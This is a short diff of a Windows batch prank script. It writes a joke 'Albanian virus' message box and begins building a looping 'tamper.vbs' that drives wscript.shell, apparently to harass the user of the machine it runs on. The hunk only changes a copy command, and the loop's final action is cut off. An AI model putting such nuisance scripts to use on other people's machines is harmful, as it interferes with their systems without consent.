@@ -7,7 +7,7 @@ echo [+] Enter the amount of time to wait in seconds && set /p timer=[+] before 
 md %tmp%\bully\ && echo [*] Created directory
 echo X=MsgBox("Hi, I am an Albanian virus but because of poor technology in my country unfortunately I am not able to harm your computer. Please be so kind to delete some of your important files yourself and then forward me to other users. Many thanks for your cooperation! Best regards, Albanian virus.",4+64,"Virus alert") > %tmp%\bully\albanian.vbs && echo [*] Meme albanian virus created
 
-cp bully.gif %tmp%\bully\bully.gif && echo [*] Gif created
+copy bully.gif %tmp%\bully\bully.gif && echo [*] Gif created
 echo set x=wscript.createobject ("wscript.shell") > %tmp%\bully\tamper.vbs
 echo do >> %tmp%\bully\tamper.vbs
 echo wscript.sleep 100 >> %tmp%\bully\tamper.vbs
